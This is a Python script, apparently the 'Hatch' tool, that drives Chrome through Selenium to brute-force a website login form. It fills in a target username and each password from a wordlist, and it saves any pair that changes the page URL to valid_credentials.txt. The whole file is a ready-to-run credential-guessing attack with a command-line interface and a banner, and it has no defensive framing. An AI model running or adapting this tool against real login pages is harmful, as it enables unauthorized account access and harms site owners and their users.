import requests
import time as t
import logging
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException, InvalidSelectorException, WebDriverException
from optparse import OptionParser

# Graphics
class Color:
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'
    CWHITE = '\33[37m'

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(levelname)s: %(message)s')

# ChromeDriver path
CHROME_DVR_DIR = r'C:\webdrivers\chromedriver.exe'

def read_web_info(file_path='web_info.txt'):
    web_info = {}
    try:
        with open(file_path, 'r') as f:
            for line in f:
                key, value = line.strip().split(': ', 1)
                web_info[key] = value
    except FileNotFoundError as e:
        logging.error(f"Web info file not found: {e}")
        exit()
    except Exception as e:
        logging.error(f"Error reading web_info.txt: {str(e)}")
        exit()
    return web_info

def test_website_access(website):
    try:
        response = requests.get(website)
        if response.status_code == 200:
            logging.info("Website is accessible.")
        else:
            logging.error("Website is not accessible. Make sure to use http/https.")
            return False
    except Exception as e:
        logging.error(f"Website could not be reached: {str(e)}")
        return False
    return True

def log_valid_credential(username, password):
    with open('valid_credentials.txt', 'a') as f:
        f.write(f"{username}: {password}\n")

def brutes(username, username_selector, password_selector, login_btn_selector, pass_list, website):
    options = Options()
    options.add_argument("--disable-popup-blocking")
    options.add_argument("--disable-extensions")

    service = Service(CHROME_DVR_DIR)
    browser = webdriver.Chrome(service=service, options=options)

    with open(pass_list, 'r') as f:
        passwords = f.readlines()

    for password in passwords:
        try:
            browser.get(website)
            t.sleep(2)

            Sel_user = browser.find_element(By.CSS_SELECTOR, username_selector)
            Sel_pas = browser.find_element(By.CSS_SELECTOR, password_selector)
            enter = browser.find_element(By.CSS_SELECTOR, login_btn_selector)

            Sel_user.send_keys(username)
            Sel_pas.send_keys(password.strip())

            enter.click()
            t.sleep(5)

            # Check login success and log valid credentials
            if browser.current_url != website:
                logging.info(f"Valid credentials found: {username} / {password.strip()}")
                log_valid_credential(username, password.strip())
                exit()

            logging.info(f"Tried password: {password.strip()} for user: {username}")
        except NoSuchElementException:
            logging.error("An element is missing, which could indicate either the password was found or you are locked out.")
            exit()
        except InvalidSelectorException:
            logging.error("An invalid selector was used. Check the selectors again.")
            exit()
        except WebDriverException as e:
            logging.error(f"WebDriver error: {str(e)}")
            browser.quit()
            exit()
        except KeyboardInterrupt:
            logging.error("User interrupted with Ctrl-C.")
            exit()

def wizard():
    print(banner)
    web_info = read_web_info()

    website = web_info.get('website')
    if not website:
        logging.error("No website specified in web_info.txt")
        return

    if not test_website_access(website):
        return

    target_username = web_info.get('target_username', '')
    password_list = web_info.get('password_list', '')

    brutes(
        target_username,
        web_info['username_selector'],
        web_info['password_selector'],
        web_info['login_button_selector'],
        password_list,
        website
    )

# Text Art:
banner = Color.BOLD + Color.RED +'''
  _    _       _       _
 | |  | |     | |     | |
 | |__| | __ _| |_ ___| |__
 |  __  |/ _` | __/ __| '_ \\
 | |  | | (_| | || (__| | | |
 |_|  |_|\__,_|\__\___|_| |_|
'''

# Argument parsing
parser = OptionParser()
parser.add_option("-u", "--username", dest="username", help="Choose the username")
parser.add_option("--passlist", dest="passlist", help="Enter the password list directory")
parser.add_option("--website", help="Choose a website")
(options, args) = parser.parse_args()

if not (options.website and options.passlist):
    wizard()
else:
    print(banner)
    web_info = read_web_info()
    brutes(
        web_info.get('target_username', ''),
        web_info['username_selector'],
        web_info['password_selector'],
        web_info['login_button_selector'],
        options.passlist,
        options.website
    )
